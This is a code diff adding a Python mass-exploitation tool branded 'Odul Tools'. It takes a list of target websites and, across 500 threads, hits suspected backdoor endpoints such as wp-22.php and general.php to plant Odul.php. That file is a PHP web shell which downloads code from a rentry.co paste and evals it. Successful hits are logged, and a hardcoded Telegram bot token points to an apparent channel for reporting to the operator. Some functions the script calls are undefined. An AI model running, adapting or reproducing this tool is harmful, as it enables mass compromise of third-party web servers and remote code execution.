@@ -1,0 +1,146 @@
+import sys, requests, re
+import random
+import string
+from multiprocessing.dummy import Pool as ThreadPool
+from colorama import Fore, init
+
+init(autoreset=True)
+
+fr = Fore.RED
+fc = Fore.CYAN
+fw = Fore.WHITE
+fg = Fore.GREEN
+fm = Fore.MAGENTA
+
+def optimas_prime_tools(length):
+    letters = string.ascii_lowercase
+    return ''.join(random.choice(letters) for _ in range(length))
+
+def read_file(filename):
+    with open(filename, 'r', encoding='utf-8') as file:
+        return file.read()
+
+
+token = "6992254944:AAEEStHFyJPEPMG443D4CKsSok9ImcnTGCQ"
+chatid = "800524508"
+
+def SendMsg(msg):
+    requests.get('https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+chatid+'&text='+msg)
+    return 
+
+print("""\033[0;32m
+[#] this tool is ::
+
+ ██████╗ ██████╗ ██╗   ██╗██╗         ████████╗ ██████╗  ██████╗ ██╗     ███████╗
+██╔═══██╗██╔══██╗██║   ██║██║         ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
+██║   ██║██║  ██║██║   ██║██║            ██║   ██║   ██║██║   ██║██║     ███████╗
+██║   ██║██║  ██║██║   ██║██║            ██║   ██║   ██║██║   ██║██║     ╚════██║
+╚██████╔╝██████╔╝╚██████╔╝███████╗       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
+ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
+               channel: https:/t.me/odultools                                                                  
+""")
+
+
+
+
+requests.packages.urllib3.disable_warnings()
+
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'  # Removed the erroneous extra string
+}
+
+try:
+    with open(sys.argv[1], 'r', encoding='utf-8') as file:
+        target = [line.strip() for line in file.readlines()]
+except IndexError:
+    path = sys.argv[0].split('\\')
+    print('\n  [!] Enter <' + path[-1] + '> <sites.txt>')
+    sys.exit(1)
+
+def URLdomain(site):
+    if site.startswith("http://"):
+        site = site.replace("http://", "")
+    elif site.startswith("https://"):
+        site = site.replace("https://", "")
+    pattern = re.compile('(.*)/')
+    while re.findall(pattern, site):
+        sitez = re.findall(pattern, site)
+        site = sitez[0]
+    return site
+shell_file = 'https://rentry.co/webitokt/raw'
+shell_files = 'https://rentry.co/webitokt/raw'
+
+def demos1(url):
+    try:
+        endpoint = '?action=add&parameter'
+        fnes = "Odul.php"
+        domain_url = 'http://' + URLdomain(url)
+        check_url = domain_url + '/rindex.php' + endpoint + '=' + fnes + '%7C'+shell_file
+        check = requests.get(check_url, headers=headers, allow_redirects=True, timeout=25)
+        vul_url = domain_url + '/' + fnes
+        vul_response = requests.get(vul_url, headers=headers, allow_redirects=True, timeout=10)
+        if "Odul Tools" in vul_response.text:
+            print(' =>  ' + domain_url + ' --> {}[Successfully Uploaded]'.format(fg))
+            with open('exploited.txt', 'a', encoding='utf-8') as file:
+                file.write(vul_url + '\n')
+        else:
+            print(' =>  ' + domain_url + ' --> {}[Not Vulnerable]'.format(fr))
+
+
+        filename = "Odul.php"
+        opvenzy = """<?php   function get($url) {    $ch = curl_init();    curl_setopt($ch, CURLOPT_HEADER, 0);    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);    curl_setopt($ch, CURLOPT_URL, $url);    $data = curl_exec($ch);    curl_close($ch);    return $data;}$ok = '?>';      eval("$ok" . get('https://rentry.co/webitokt/raw'));?>"""
+        domain_url = 'http://' + URLdomain(url)
+        check_url = domain_url+'/wp-22.php?sfilename='+filename+'&sfilecontent='+opvenzy+'&supfiles='+filename
+        check = requests.get(check_url, headers=headers, allow_redirects=True, timeout=25)
+        vul_url = domain_url + '/' + filename
+        vul_response = requests.get(vul_url, headers=headers, allow_redirects=True, timeout=10)
+        if "exploited" in vul_response.text:
+            print(' =>  ' + domain_url + ' --> {}[Successfully Uploaded]'.format(fg))
+            with open('exploited.txt', 'a', encoding='utf-8') as file:
+                file.write(vul_url + '\n')
+        else:
+            print(' =>  ' + domain_url + ' --> {}[Not Vulnerable]'.format(fr))
+
+
+        end_point = '?pd=1&mapname'
+        exp_var = 'a=vx000&dstr'
+        filenames = "Odul.php"
+        opvenzy = """<?php   function get($url) {    $ch = curl_init();    curl_setopt($ch, CURLOPT_HEADER, 0);    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);    curl_setopt($ch, CURLOPT_URL, $url);    $data = curl_exec($ch);    curl_close($ch);    return $data;}$ok = '?>';      eval("$ok" . get('https://rentry.co/webitokt/raw'));?>"""
+        domain_url = 'http://' + URLdomain(url)
+        check_url = domain_url+'/general.php'+end_point+'='+filenames+'&'+exp_var+'='+opvenzy
+        check = requests.get(check_url, headers=headers, allow_redirects=True, timeout=25)
+        vul_url = domain_url + '/' + filenames
+        vul_response = requests.get(vul_url, headers=headers, allow_redirects=True, timeout=10)
+        if "Odul Tools" in vul_response.text:
+            print(' =>  ' + domain_url + ' --> {}[Successfully Uploaded]'.format(fg))
+            with open('exploited.txt', 'a', encoding='utf-8') as file:
+                file.write(vul_url + '\n')
+        else:
+            print(' =>  ' + domain_url + ' --> {}[Not Vulnerable]'.format(fr))
+
+    except:
+        print(' =>  ' + url + ' --> {}[Connection Refused]'.format(fr))
+
+
+
+
+def main(url):
+    try:
+        
+        demos1(url);demos2(url);demos3(url);demos4(url);demos5(url)
+    except KeyboardInterrupt:exit()
+    except:
+        pass
+
+mp = ThreadPool(500)
+mp.map(main, target)
+mp.close()
+mp.join()
+main()
